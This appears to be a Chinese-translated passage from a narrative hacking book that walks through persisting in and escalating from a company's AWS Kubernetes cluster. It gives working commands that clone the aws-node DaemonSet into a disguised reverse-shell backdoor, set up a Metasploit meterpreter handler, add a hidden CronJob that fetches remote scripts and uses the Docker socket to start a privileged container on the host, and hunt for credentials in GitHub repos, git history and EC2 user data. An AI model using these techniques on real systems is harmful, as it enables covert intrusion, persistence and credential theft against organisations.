伪造容器的名称（`amazon-k8s-cni`）和 S3 存储桶（`amazon-cni-plugin-essentials`）并非随意选择。EKS 在每个节点上都运行一个类似容器的副本来管理 Pod 和节点的网络配置，正如我们从任何运行集群中抓取 Pod 列表时可以看到的那样：

```
shell> kubectl get pods -n kube-system | grep aws-node
aws-node-rb8n2      1/1     Running   0   7d
aws-node-rs9d1      1/1     Running   0   23h
--snip--
```

这些名为 `aws-node-xxxx` 的 Pod 运行着托管在 AWS 自有仓库上的官方 `amazon-k8s-cni` 镜像。

这些 Pod 由 DaemonSet 对象创建，Kubernetes 资源可确保在所有（或部分）节点上始终运行给定 Pod 的至少一个副本。这些 `aws-node` Pod 中的每一个都被分配了一个服务账户，具有只读访问所有命名空间、节点和 Pod 的权限。更不用说，它们都自动挂载 `/var/run/docker.sock`，从而在主机上获得 root 权限。这是完美的掩护。

我们将生成一个几乎完全相同的 DaemonSet 的副本。与真实的相比，这个新的 DaemonSet 将从我们自己的 ECR 仓库获取其 `amazon-k8s-cni` Pod 镜像。DaemonSet 默认在所有机器上运行。我们不想一次有数千个反向 shell 同时呼叫回家，所以我们只会针对少数几个节点——例如带有“kafka-broker-collector”标签的三个节点。这对于我们的邪恶 DaemonSet 来说是一个很好的种群规模。

以下命令显示机器名称及其标签：

```
shell> kubectl get nodes --show-labels
ip-192-168-178-150.eu-west-1.compute.internal
service=kafka-broker-collector,
beta.kubernetes.io/arch=amd64,
beta.kubernetes.io/instance-type=t2.small, beta.kubernetes.io/os=linux
```

```
ip-192-168-178-150.eu-west-1.compute.internal
--snip--
```



`ip-192-168-178-150.eu-west-1.compute.internal`

--snip--

我们已经选定了目标。我们的有效载荷已锁定并准备就绪。下一步是创建 DaemonSet 对象。

无需去寻找 DaemonSet 的 YAML 定义；我们只需导出合法 `aws-node` 使用的 DaemonSet，更新容器镜像字段使其指向我们自己的仓库，修改显示名称（`aws-node-cni` 而非 `aws-node`），更改容器端口以避免与现有 DaemonSet 冲突，最后添加标签选择器以匹配 `kafka-broker-collector`。在第 9-5 节中，我们重新提交修改后的文件以进行调度。

```
shell> kubectl get DaemonSet aws-node -o yaml -n kube-system > aws-ds-manifest.yaml
```

# Replace the container image with our own image

```
shell> sed -E "s/image: .* /image: 886477354405.dkr.ecr.eu-west-1.amazonaws.com/\namazon-k8s-cni:v1.5.3/g" -i aws-ds-manifest.yaml
```

# Replace the name of the DaemonSet

```
shell> sed "s/ name: aws-node/ name: aws-node-cni/g" -i aws-ds-manifest.yaml
```

# Replace the host and container port to avoid conflict

```
shell> sed -E "s/Port: [0-9]+/Port: 12711/g" -i aws-ds-manifest.yaml
```

# Update the node label key and value

```
shell> sed "s/ key: beta.kubernetes.io/os/ key: service/g" -i aws-ds-manifest.yaml
```

```
shell> sed "s/ linux/ kafka-broker-collector/g" -i aws-ds-manifest.yaml
```

### 第 9-5 节：创建我们自己的伪造 DaemonSet

经过几次 `sed` 命令后，我们的更新后的清单已准备好推送到 API 服务器。

与此同时，我们回到 Metasploit 容器，设置一个监听器，在 443 端口提供 `meterpreter_reverse_https` 类型的有效载荷，如下所示。当然，此有效载荷类型与本章开头 `msfvenom` 命令中使用的相同：

```
root@Point1:~# docker ps

CONTAINER ID   IMAGE        COMMAND

8e4adacc6e61   phocean/msf  " /bin/sh -c \"init.sh\""
```

```
root@Point1:~# docker attach 8e4adacc6e61
```

```
root@fcd4030:/opt/metasploit-framework# ./msfconsole
```

```
msf > use exploit/multi/handler
msf multi/handler> set payload linux/x64/meterpreter_reverse_https
msf multi/handler> set LPORT 443
msf multi/handler> set LHOST 0.0.0.0
msf multi/handler> set LURI /msf
```

```
msf multi/handler> set ExitOnSession false
msf multi/handler> run -j
[*] Exploit running as background job 3
```

我们将此更新后的清单推送到集群，这将创建 DaemonSet 对象以及三个反向 shell 容器：

```
shell> kubectl apply -f -n kube-system aws-ds-manifest.yaml
daemonset.apps/aws-node-cni created
```

## Metasploit 容器

```
[*] https://0.0.0.0:443 handling request from 34.244.205.187;
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
```

太棒了。节点可能会宕机，Pod 也可能被清除，但只要存在带有标签 `kafka-collector-broker` 的节点，我们的恶意容器就会一次又一次地被调度到它们上面，使我们的后门复活。毕竟，谁敢质疑明显与 EKS 集群关键组件相关的、看起来像亚马逊的 Pod 呢？以混淆取胜的安全策略可能不是一种成功的防御策略，但在进攻世界中它却是黄金法则。

注意 我们可以使用 ReplicaSet 对象而不是 DaemonSet 来实现相同的弹性。ReplicaSet 确保给定 Pod 的副本数量始终固定。我们可以配置此 ReplicaSet 以模仿 `aws-node` DaemonSet 的属性和标签。这种方法的优点是我们可以直接将 Pod 命名为 `aws-node` 而不是 `aws-node-cni`，因为它们将属于不同的 Kubernetes 对象（ReplicaSet 而非 DaemonSet）。

## 隐蔽的后门

我们稳定的后门非常有弹性，能够在节点终止后存活，但它有点吵闹。Pod 和 DaemonSet 不断运行并在集群中可见。因此，我们用一个更隐蔽、只偶尔启动的后门来补充它。

我们在集群级别设置了一个 cron 作业，每天上午 10 点运行以启动一个 Pod。我们将使用与 DaemonSet 中不同的 AWS 账户，以确保我们的后门之间不会共享数据或技术。第 9-6 节展示了该 cron 作业的清单文件。

```
apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: metrics-collect
spec:
  schedule: "0 10 * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
            - name: metrics-collect
              image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector
              volumeMounts:
                - mountPath: /var/run/docker.sock
                  name: dockersock
          volumes:
            - name: dockersock
              hostPath:
                path: /var/run/docker.sock
          restartPolicy: Never
```

### 第 9-6 节：我们隐蔽后门的 cron 作业

此 cron 作业从我们控制的另一个 AWS 账户加载 `amazon-metrics-collector` 镜像。此 Docker 镜像结构更厚，甚至可能冒充合法的指标作业（参见第 9-7 节）。

```
# Dockerfile
FROM debian:buster-slim
RUN apt update && apt install -y git make
RUN apt install -y prometheus-varnish-exporter
COPY init.sh /var/run/init.sh
ENTRYPOINT ["/var/run/init.sh"]
```



### 第 9-7 节：在启动时安装多个软件包并执行脚本的 Dockerfile

在无用软件包和数十行虚拟代码的伪装之下，深藏在 `init.sh` 内部，我们放置一条指令，用于下载并执行托管在 S3 上的自定义脚本。起初，此远程脚本将是一个无害的虚拟 `echo` 命令。当我们想要激活此后门以重新获得系统访问权限时，我们会用自定义的 `meterpreter` 覆盖 S3 上的文件。这是一种休眠 shell，仅在紧急情况下使用。

然而，此设置并不能完全解决原始的可见性问题。一旦我们激活 shell，系统上就会有一个不断运行的 Pod，对每个 Kube 管理员都可见。

一个优化措施是避免直接在外部容器 `metrics-collector` Pod 上执行我们的自定义 stager。相反，我们将使用此 Pod 联系我们很方便地挂载的 Docker socket，并指示它在主机上启动另一个容器，该容器随后将加载 `meterpreter` 代理。`metrics-collector` Pod 在完成任务后可以优雅地终止，而我们的 shell 则不受阻碍地在其自己的第二个容器中继续运行。

此第二个容器对 Kubernetes 完全不可见，因为它未附加到 ReplicaSet 或 DaemonSet 等现有对象，而是由 Docker 在节点上创建的。该容器将在特权模式下以最少的监督静默继续运行。第 9-8 节给出了通过 Docker API 拉取、创建和启动此类容器的三个 `curl` 命令。此脚本应由我们之前定义的 `amazon-metrics-collector` 容器加载并执行。

# Pull the image from the ECR registry

```
curl \
--silent \
--unix-socket /var/run/docker.sock \
"http://docker/images/create?fromImage=881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64" \
-X POST
```

# Create the container from the image and mount the / directory

```
curl \
--silent \
--unix-socket /var/run/docker.sock \
"http://docker/containers/create?name=pause-go-amd64-4413" \
-X POST \
-H "Content-Type: application/json" \
-d '{"Image": "881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64", "Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}'
```

# Start the container

```
curl \
--silent \
--unix-socket /var/run/docker.sock \
"http://docker/containers/pause-go-amd64-4413/start" \
-X POST \
-H "Content-Type: application/json" \
--output /dev/null \
--write-out "%{http_code}"
```

### 第 9-8 节：拉取新 Docker 镜像、创建容器并启动它的脚本

为了进一步隐藏我们的 rogue 容器，我们将其混入通常在任何给定节点上运行的众多 `pause` 容器中。`pause` 容器在 Kubernetes 架构中发挥关键作用，因为它是继承分配给 Pod 的所有命名空间并与内部容器共享的容器。`pause` 容器的数量与 Pod 的数量一样多，所以多一个几乎不会引起注意。

**注意** Kube 有一种名为 `mutating webhook` 的资源，可在飞行中修补 Pod 清单以注入容器、卷等。它配置起来很棘手，但可以致命地实现持久性。然而，我们需要集群至少为 1.15 版本才能可靠地武器化 Pod。有关实用信息，请参阅 Alex Leonhardt 的 Medium 文章“Writing a Very Basic Kubernetes Mutating Admission Webhook”。

在此阶段，我们在 Kubernetes 集群上已经拥有相当稳固的立足点。我们可以在随机节点上继续启动进程，以防有人销毁我们的 Kube 资源，但希望到那时我们已经完成了业务。

### 资源
- 有关 `meterpreter` 有效载荷的更多信息，请在 `https://blog.rapid7.com/` 上搜索 OJ Reeves 的文章“Deep Dive into Stageless Meterpreter Payloads”。
- 有关 `memcpy` 和 `mprotect` 在 `shellcode` 执行中威力的深入文章，请参阅 Shivam Shrirao 的“Make Stack Executable Again”：`http://bit.ly/3601dxh`。
- `@nsxz` 的 `ReflectiveELFLoader` 提供了一个概念验证：`https://github.com/nsxz/ReflectiveELFLoader/`。代码记录良好，但需要一定的 ELF 头知识；请参阅 `https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267/`。
- Linux 上仅内存执行的各种方法汇编可在 `http://bit.ly/35YMiTY` 找到。
- `Memfd` 于 Linux 内核 3.17 中引入。请参阅 `memfd_create` 手册页：`http://bit.ly/3aeig27`。
- 有关 DaemonSets 的更多信息，请参阅 Kubernetes 文档：`http://bit.ly/2TBkmD8`。
- 有关 Docker 的帮助，请参阅 API 文档：`https://dockr.ly/2QKr1ck`。

## 第四部分

## 内部敌人

> 重力不是真理的一种版本。它就是真理。任何怀疑它的人都被邀请从十楼窗户跳出去。
Richard Dawkins

## 10

## 内部敌人

![](img/961e81aef23040d0fbe348f58c055860_187_0.png)

在上一章中，我们接管了 MXR Ads 的交付集群。这带来了数百个密钥，从 AWS 访问密钥到 GitHub 令牌不等，承诺可以访问几乎所有涉及广告投放的数据库。我们尚未成为 AWS 账户的管理员，但也只差一步之遥。我们需要理清收集到的所有数据，并利用它找到提升权限的方法，甚至可能揭开 MXR Ads 与 Gretsch Politico 之间的隐藏联系。

## 通往神化的道路

我们加载从 Kube 检索到的 AWS 访问密钥，并查看随机用户的权限。例如，第 8 章中的 Kevin 就是一个不错的目标：

```
root@Point1:~/# aws iam get-user --profile kevin

"User": {

  "UserName": "kevin.duncan",

--snip--
```

我们知道，默认情况下，IAM 用户在 AWS 上完全没有任何权限。他们甚至无法更改自己的密码。因此，公司几乎总是会授予用户在处理用户和权限的 IAM 服务上仅足够的权限，以执行诸如更改密码、列出策略、启用多因素身份验证等基本操作。

为了限制这些权限的范围，管理员通常会添加条件，仅接受针对调用用户本身的 IAM API 调用。例如，Kevin 可能被允许列出他自己的权限，但不能列出附加到其他用户的权限：

```
root@Point1:~/# aws iam list-attached-user-policies \
--user-name=kevin.duncan \
--profile kevin

"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-self-manage",

"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-read-only",

"PolicyArn": "arn:aws:iam::886371554408:policy/mxrads-eks-admin"
```

的确，只要我们在 Kevin 以外的资源上调用 IAM 命令，就会立即收到错误，如下所示：

```
root@Point1:~/# aws iam get-policy \
--policy-arn mxrads-self-manage \
--profile kevin

An error occurred (AccessDenied) when calling the GetPolicy operation:
```



User: `arn:aws:iam::886371554408:user/kevin.duncan` is not authorized to

perform: `iam:GetPolicy` on resource: `policy`

`arn:aws:iam::886371554408:policy/mxrads-eks-admin...`

AWS 在访问权限方面管理得很严格。幸运的是，Kevin 策略的名称足够明确，我们可以猜测其内容：`mxrads-eks-admin` 表示 Kevin 是 EKS 的管理员，而 `mxrads-read-only` 可能赋予 Kevin 对 MXR Ads 使用的 165 个 AWS 服务子集的只读访问权限。只是需要尝试推断出具体是哪一些。最后一个策略 `mxrads-self-manage` 应该包含 Kevin 管理其账户的权限集合。

探索这些服务中的每一个可能需要数小时甚至数天的时间，尤其是对于如此投入 AWS 且业务架构复杂的公司。我们需要保持专注：我们正在寻找与 Gretsch Politico 相关的任何信息——具体来说是关于其客户或数据画像活动的资料。这可能以 S3 存储桶的形式出现，其中存放着数字广告评级（DAR）细分（用于衡量广告活动效果），也可能是一个 RDS 数据库表、运行在 EC2 上的 Web 服务器、API Gateway 上的代理服务、AWS Simple Queue Service（SQS）上的消息队列……在目前可用的十几个 AWS 区域中的任何一个。是的，我能感受到并分享你的沮丧。

幸运的是，AWS 有一个跨越给定区域多种资源类型和服务的实用 API：Resource Groups Tagging API。该 API 会返回 S3 存储桶、VPC 端点、数据库等，前提是对象具有标签。任何基础设施卫生状况最基本的公司都会确保为其资源打上标签，至少是为了计费目的，因此我们可以相当确信此 API 调用返回的结果是准确且全面的。我们首先列出 `eu-west-1` 区域的资源，如清单 10-1 所示。

```bash
root@Point1:~/# aws resourcegroupstaggingapi get-resources \
--region eu-west-1 \
--profile kevin > tagged_resources_euw1.txt
root@Point1:~/# head tagged_resources_euw1.txt
ResourceARN: arn:aws:ec2:eu-west-1:886371554408:vpc/vpc-01e638,
Tags: [ "Key": "Name", "Value": "privateVPC"]
--snip--
arn:aws:ec2:eu-west-1:886371554408:security-group/sg-07108...
arn:aws:lambda:eu-west-1:886371554408:function:tag_index
arn:aws:events:eu-west-1:886371554408:rule/asg-controller3
arn:aws:dynamodb:eu-west-1:886371554408:table/cruise_case
--snip--
```

*清单 10-1：列出 eu-west-1 的资源*

如果 Kevin 缺少列出资源标签（`tag:GetResources`）的必要权限，我们就只能手动开始探索最常用的 AWS 服务，例如 EC2、S3、Lambda、RDS、DynamoDB、API Gateway、ECR、KMS 和 Redshift。Redshift 是针对分析优化的托管 PostgreSQL，DynamoDB 是仿 MongoDB 的托管非关系型数据库，API Gateway 是将请求中继到您选择的后端的托管代理，而 Lambda 是一项在 AWS 自有实例上运行代码的服务（稍后会详细介绍）。这些基础服务甚至被 AWS 自身内部用于构建更复杂的产品，如 EKS，实际上 EKS 不过是 EC2、ECR、API Gateway、Lambda、DynamoDB 等服务的组合。

**注意** *有许多 AWS 审计和渗透测试工具可以枚举服务和资源。请查看 Toniiblyx 在 GitHub 上的汇编 https://github.com/toniblyx/my-arsenal-of-aws-security-tools/。请注意，大多数这些工具可能会向 AWS 发出大量 API 调用，这种活动即使在最少的监控下也能被发现（稍后会详细介绍）。*

从清单 10-1 中，我们从 MXR Ads 账户中提取了超过 8,000 个带标签的资源，因此自然而然地，我们转向我们信赖的 `grep` 命令来查找对 GP 的引用：

```
root@Point1:~# egrep -i "gretsch|politico|gpoli" tagged_resources_euw1.txt
ResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-politico,
--snip--
```

太棒了！这就是我们隐藏的针。MXR Ads 有一个 Lambda 函数，似乎在与 Gretsch Politico 交换数据。AWS Lambda 是无服务器世界的黄金标准。你将 Python 源代码、Ruby 脚本或 Go 二进制文件打包到 ZIP 文件中，连同几个环境变量和 CPU/内存规格一起发送给 AWS Lambda，AWS 就会为你运行它。

该过程无需机器配置、systemd 设置和 SSH 的麻烦。你只需指向一个 ZIP 文件，它就会在你选择的时间执行。Lambda 函数甚至可以由其他 AWS 服务触发的外部事件触发，例如 S3 上的文件接收。Lambda 是一个功能强大的 crontab，它改变了人们编排工作负载的方式。

让我们更仔细地看看这个 `dmp-sync` Lambda 函数（见清单 10-2）。

```
root@Point1:~# aws lambda get-function \
--function-name dmp-sync-gretsch-politico \
--region eu-west-1 \
--profile kevin
--snip--
RepositoryType: S3,
Location: https://mxrads-lambdas.s3.eu-west-1.amazonaws.com/functions/dmp-sync-gp?versionId=YbSa...
```

清单 10-2：`dmp-sync` Lambda 函数的描述

我们在清单 10-2 中看到，Lambda 函数从 S3 路径 `mxrads-lambdas/dmp-sync-gp` 检索其需要执行的编译代码。我们立即冲向键盘并开始输入下一个命令：

```
root@Point1:~# aws s3api get-object \
--bucket mxrads-lambdas \
--key functions/dmp-sync-gp dmp-sync-gp \
--profile kevin
An error occurred (AccessDenied) when calling the GetObject operation:
Access Denied
```

但遗憾的是，Kevin 并未被信任到足以获得此存储桶的访问权限。我们可以用过去几天收到的所有“Access Denied”消息堆砌一堵墙。

相反，我们更仔细地查看 Lambda 定义，发现它冒充了 AWS 角色 `lambda-dmp-sync`，并且依赖于几个环境变量来执行其任务（参见清单 10-3）。

```
root@Point1:~/# aws lambda get-function \
--function-name dmp-sync-gretsch-politico \
--region eu-west-1 \
--profile kevin
--snip--
Role: arn:aws:iam::886371554408:role/lambda-dmp-sync,
Environment: {
  Variables: {
    ① SRCBUCKET: mxrads-logs,
    ② DSTBUCKET: gretsch-streaming-jobs,
    SLACK_WEBHOOK: AQICAHajdGiAwfogxzeE887914..., 
    DB_LOGS_PASS: AQICAHgE4keraj896yUIeg93GfwEn ep...
--snip--
```



### 清单 10-3：dmp-sync Lambda 函数的配置

这些设置表明代码操作的是 MXR Ads 的日志 ①，并且可能在将其发送到 Gretsch Politico 的 S3 存储桶 ② 之前，用与投放活动相关的额外信息对其进行水合。

我们发现这个 GP 存储桶是一个外部存储桶，因为它没有出现在我们当前的 MXR Ads 存储桶列表中。 不用说，我们当前的访问密钥甚至会被禁止列出该外部存储桶，但我们确信与 Lambda 关联的角色（`lambda-dmp-sync`）可以做到。 问题是，我们如何冒充此角色？

一种可能的冒充 Lambda 角色的方法是追查包含此 Lambda 函数源代码的 GitHub 仓库——假设我们能找到一个具有读写权限的账户。 然后我们可以 `smuggle in` 几行代码以在运行时检索该角色的访问密钥并使用它们读取存储桶的内容。 这很诱人，但该程序会带来很大的暴露风险。 在 Slack 通知和 GitHub 邮件之间，最小的提交都可能广播给整个技术团队。 不太理想。

AWS 确实通过 STS API 提供了冒充任何角色的自然方式，但，哎呀，我们需要一些特权来调用此命令。 没有明智的管理员会将 STS API 包含在分配给开发人员的只读策略中。

让我们先搁置这个角色冒充的想法，继续探索其他 AWS 服务。 肯定有一些东西我们可以利用来提升权限。

让我们在 EC2 服务中探查一下并描述所有正在运行的实例（参见清单 10-4）。 还记得上次我们在第 8 章尝试此操作时，我们被限制在 Kubernetes 节点上吗？ 多亏了 Kevin 的宽松只读策略，这些束缚才被解开了。

```
root@Point1:~/# aws ec2 describe-instances \
--region=eu-west-1 \
--profile kevin > all_instances_euw1.txt
root@Point1:~/# head all_instances_euw1.txt
```

```
--snip--
"InstanceId": "i-09072954011e63aer",
"InstanceType": "c5.4xlarge",
"Key": "Name", "Value": "cassandra-master-05789454"
"InstanceId": "i-08777962411e156df",
"InstanceType": "m5.8xlarge",
"Key": "Name", "Value": "lib-jobs-dev-778955944de"
"InstanceId": "i-08543949421e17af",
"InstanceType": "c5d.9xlarge",
"Key": "Name", "Value": "analytics-tracker-master-7efece4ae"
--snip--
```

### 清单 10-4：描述 eu-west-1 的 EC2 实例

我们发现仅在 `eu-west-1` 区域就有近 2,000 台机器——几乎是 Kubernetes 生产集群处理的服务器数量的三倍。 MXR Ads 仅在 Kube 上略有涉足；它尚未迁移其余的工作负载和数据库。

从这 2,000 台机器中，我们需要挑选一个目标。 让我们忘掉业务应用程序吧；我们惨痛地学到 MXR Ads 对其 IAM 角色进行了严格锁定。 我们在开始进行基本侦察时为每个获得的访问权限而苦苦挣扎。 不，要实现对 AWS 的完全统治，我们需要攻破一个基础设施管理工具。

## 自动化工具接管

即使 AWS 提供了所有自动化，没有一个团队能够在没有一套广泛的工具集来安排、自动化和标准化操作的情况下处理 2,000 台服务器和数百个微服务。 我们正在寻找类似 Rundeck、Chef、Jenkins、Ansible、Terraform、TravisCI 或任何数百种 DevOps 工具的东西。

NOTE Digital.ai 有一份关于一些最臭名昭著的 DevOps 工具的有趣列表：https://digital.ai/periodic-table-of-devops-tools.

Terraform 有助于跟踪在 AWS 上运行的组件，Ansible 配置服务器并安装所需的软件包，Rundeck 在数据库之间安排维护作业，而 Jenkins 构建应用程序并将其部署到生产环境。 公司规模越大，它就需要一套更坚实、标准的工具来支持和推动这种增长。 我们遍历正在运行的机器列表寻找工具名称：

```
root@Point1:~# egrep -i -A1 \
"jenkins|rundeck|chef|terraform|puppet|circle|travis|graphite" all_instances_euw1.txt
"InstanceId": "i-09072954011e63aer",
"Key": "Name",  "Value": "jenkins-master-6597899842"
"PrivateDnsName": "ip-10-5-20-239.eu-west-1.compute.internal"
```

```
"InstanceId": "i-08777962411e156df",
"Key": "Name",  "Value": "chef-server-master-8e7fea545ed"
"PrivateDnsName": "ip-10-5-29-139.eu-west-1.compute.internal"
"InstanceId": "i-08777962411e156df",
"Key": "Name",  "Value": "jenkins-worker-e7de87adecc"
"PrivateDnsName": "ip-10-5-10-58.eu-west-1.compute.internal"
```

--snip--

太棒了！ 我们得到了 Jenkins 和 Chef 的命中。 让我们专注于这两个组件，因为它们具有很大的潜力。

## 全能的 Jenkins

Jenkins 是一款复杂的软件，可以承担多种角色。 例如，开发人员可以利用它以自动化方式编译、测试和发布其代码。 为此目的，当新文件推送到仓库时，GitHub 会触发一个 POST 请求（webhook）到 Jenkins，后者对应用程序的最新推送版本运行端到端测试。 一旦代码合并，Jenkins 会自动触发另一个作业，将代码部署到生产服务器。 这个过程通常被称为 *持续集成/持续交付 (CI/CD)*。

另一方面，管理员可以利用它运行某些基础设施任务，例如创建 Kubernetes 资源或在 AWS 上启动新机器。 数据科学家可能会安排其工作负载从数据库中提取数据、对其进行转换并将其推送到 S3。 用例在企业世界中比比皆是，仅受 DevOps 人员的想象力（有时是清醒程度）的限制。

像 Jenkins 这样的工具实际上是使 DevOps 哲学公然推动的乌托邦思想得以实现和赋能的代理。 确实，对于每家公司来说，从头开始实现像持续测试和交付这样复杂的系统几乎是不可能的。 对自动化每项微小操作的近乎病态的痴迷，使得像 Jenkins 这样的工具从简单的测试框架提升为任何基础设施的至高无上的神。

由于 Jenkins 需要动态测试和构建应用程序，通常会在磁盘上的某个地方放置一个 GitHub 令牌。 它还需要将应用程序和容器部署到生产环境，因此管理员通常会在 Jenkins 配置文件中添加具有 ECR、EC2 和可能 S3 写入访问权限的 AWS 访问密钥。 管理员还希望利用 Jenkins 运行其 Terraform 命令，而 Terraform 按设计对 AWS 具有完全控制权。 现在 Jenkins 也是如此。 并且由于 Terraform 由 Jenkins 作业管理，为什么不添加 Kubernetes 命令以集中操作呢？ 把那些集群管理员权限拿来吧？ Jenkins 需要它们。

如果不密切监控，这些 CI/CD 管道——在本例中为 Jenkins——可能会迅速发展成为一个复杂的基础设施神经纤维网络的交汇点，如果轻轻而熟练地触碰它，可能会导致极乐——这正是我们要做的。

我们坦率地尝试在没有任何身份验证的情况下直接访问 Jenkins。
Jenkins 默认在端口 `8080` 上监听，因此我们使用现有的 meterpreter shell 向服务器发出 HTTP 查询：

```
# Our backdoored pod on the Kubernetes cluster
meterpreter > execute curl -I -X GET -D http://ip-10-5-20-239.eu-west-1.compute.internal:8080
HTTP/1.1 301
Location: https://www.github.com/hub/oauth_login
content-type: text/html; charset=iso-8859-1
--snip--
```



我们立即被拒绝。 这很正常，毕竟任何一个依赖此类关键交付组件的像样公司都会采取最低限度的保护措施。 通往 Jenkins 的道路不是通过正门，而是通过小巷窗户上的一个小裂缝：`Chef` 服务器，它可能最初帮助设置了 Jenkins。

## 地狱厨房

`Chef`，就像 `Ansible` 一样，是一种软件配置工具。 你将一台新安装的机器注册到 `Chef`，它会拉取并执行一组预定义指令，自动在你的机器上设置工具。 例如，如果你的机器是一个 Web 应用程序，`Chef` 将安装 `Nginx`，设置 `MySQL` 客户端，复制 SSH 配置文件，添加一个管理员用户，并添加任何其他指定的所需软件。

配置指令是用 `Ruby` 编写的，并被 `Chef` 归为——在一个精心设计的比喻中——`cookbooks` 和 `recipes`。 清单 10-5 是一个 `Chef` 配方示例，它创建了一个 `config.json` 文件并将用户添加到 `docker` 组。

```
# recipe.rb

# Copy the file seed-config.json on the new machine

cookbook_file config_json do

  source 'seed-config.json'

  owner 'root'

end

# Append the user admin to the docker group

group 'docker' do

  group_name 'docker'

  append true

  members 'admin'

  action :manage

end

--snip--
```

### 清单 10-5：一个创建 config.json 文件并将用户添加到 docker 组的 Chef 配方

密钥和密码是任何服务器配置的关键要素——尤其是那种由于其设计本质而与基础设施几乎每个组件通信的服务器。我当然说的是 `Jenkins`！

如果你严格遵循良好的 DevOps 实践，一切都应该是自动化的、可重复的，更重要的是，可版本化的。你不能手工安装 `Jenkins` 或其他任何工具。你必须使用像 `Chef` 或 `Ansible` 这样的管理工具来描述你的 `Jenkins` 配置并将其部署到一台全新的机器上。对此配置的任何更改，例如升级插件或添加用户，都应通过该管理工具进行，该工具会在将其应用到生产环境之前跟踪、版本化并测试更改。这就是基础设施即代码的精髓。开发人员最喜欢用于存储代码的版本控制系统是什么？当然是 `GitHub`！

我们可以通过列出 `MXR Ads` 的所有私有仓库并查找任何提及 `Jenkins` 相关 `Chef` cookbook 的内容，来快速验证 `Chef` 配方是否已为此任务存储在 `GitHub` 上。记住，我们已经通过 `Kubernetes` 获得了有效的 `GitHub` 令牌。我们首先提取仓库列表：

```
# list_repos.py

from github import Github

g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")

for repo in g.get_user().get_repos():

    print(repo.name, repo.clone_url)
```

我们随后搜索诸如 `cookbook`、`Jenkins`、`Chef`、`recipe` 等关键词的引用（见清单 10-6）。

```
root@Point1:~/# python3 list_repos.py > list_repos.txt
root@Point1:~/# egrep -i "cookbook|jenkins|chef" list_repos.txt
cookbook-generator https://github.com/mxrads/cookbook-generator.git
cookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git
cookbook-mxrads-jenkins-ci https://github.com/mxrads/cookbook-jenkins-ci.git
--snip--
```

清单 10-6：匹配关键词 `cookbook`、`Jenkins` 和 `Chef` 中至少一个的 `MXR Ads` 仓库列表

Bingo！我们下载 `cookbook-mxrads-jenkins-ci` 仓库：

```
root@Point1:~/# git clone https://github.com/mxrads/cookbook-mxrads-jenkins-ci.git
```

然后我们浏览源代码，希望能找到一些硬编码的凭据：

```
root@Point1:~/# egrep -i "password|secret|token|key" cookbook-jenkins-ci
default['jenkins']['keys']['operations_redshift_rw_password'] = 'AQICAHhKmtEfZEcJQ9X...'
default['jenkins']['keys']['operations_aws_access_key_id'] = 'AQICAHhKmtEfZEcJQ9X...'
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZECJ0Q9X1w...'
default['jenkins']['keys']['operations_price_cipher_crypto_key'] = 'AQICAHhKmtEfZE...'
```

我们发现大约 50 个密钥定义在方便地命名为 `secrets.rb` 的文件中，但不要太兴奋。这些并不是简单的明文密码。它们都以六个神奇字母 `AQICAH` 开头，这表明它们使用了 `AWS KMS`，即 `AWS` 提供的用于加密/解密静态数据的密钥管理服务。访问其解密密钥需要特定的 `IAM` 权限，而我们的用户 `Kevin` 很可能不具备。`cookbook` 的 `README` 文件对密钥管理描述得相当清楚：

```
# README.md

KMS Encryption :

Secrets must now be encrypted using KMS. Here is how to do so.

Let's say your credentials are in /path/to/credentials...
```

我喜欢那句话中的一个关键词是“now”。这表明不久前密钥的处理方式不同，可能根本没有加密。我们查看 Git 提交历史：

```
root@Point1:~# git rev-list --all | xargs git grep "aws_secret"
e365cd828298d55...:secrets.rb:
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZECJ0Q9X1w...'
623b30f7ab4c18f...:secrets.rb:
default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZECJ0Q9X1w...'
```

有人一定已经妥善清理了。`secrets.rb` 的所有先前版本都包含相同加密的数据。

没关系。`GitHub` 并不是存储 `cookbook` 的唯一版本化仓库。`Chef` 有自己的本地数据存储，用于保存其资源的各个版本。运气好的话，我们也许可以下载一个包含明文凭据的 `cookbook` 早期版本。

与 `Chef` 服务器的通信通常受到良好保护。`Chef` 管理的每个服务器都会获得一个专用的私钥来下载 `cookbook`、策略和其他资源。管理员也可以使用 API 令牌远程执行任务。

不过好消息是，资源之间没有隔离。我们只需要一个有效的私钥——对我们来说属于一个虚拟测试服务器也无所谓——就可以读取 `Chef` 上存储的每一个 `cookbook` 文件。没有信任，生活还有什么意义！

这个私钥应该不难找到。我们可以读取 `EC2` API，范围约为 2,000 台服务器。肯定其中一台在用户数据中硬编码了 `Chef` 私钥。我们只需要执行 2,000 次 API 调用。

乍一看似乎是一项艰巨而繁琐的任务，但实际上可以轻松自动化。得益于存储在 `MXR Ads GitHub` 仓库中的 `cookbook`，我们已经知道哪些服务依赖于 `Chef`：`Cassandra`（NoSQL 数据库）、`Kafka`（流媒体软件）、`Jenkins`、`Nexus`（代码仓库）、`Grafana`（仪表板和指标），以及一些其他服务。

我们将这些服务名称作为关键词存储在一个文件中，然后将其提供给一个循环，该循环检索带有与关键词匹配的标签名称的实例，如下所示。我们提取每个属于同一服务的机器池的第一个实例 ID，因为例如所有 `Cassandra` 机器很可能共享相同用户数据，所以我们只需要一个实例：



这种相当即兴的抽样方法给我们大约 20 个实例 ID，每个都指向托管不同服务的机器：

```
root@Point1:~/# head list_ids.txt
i-08072939411515dac
i-080746959025ceae
i-91263120217ecdef
--snip--
```

我们循环遍历此文件，调用 `ec2 describe-instance-attribute` API 来获取用户数据，对其进行解码并存储到文件中：

```
root@Point1:~/# while read p; do
  userData=$(aws ec2 describe-instance-attribute \
    --instance-id $p \
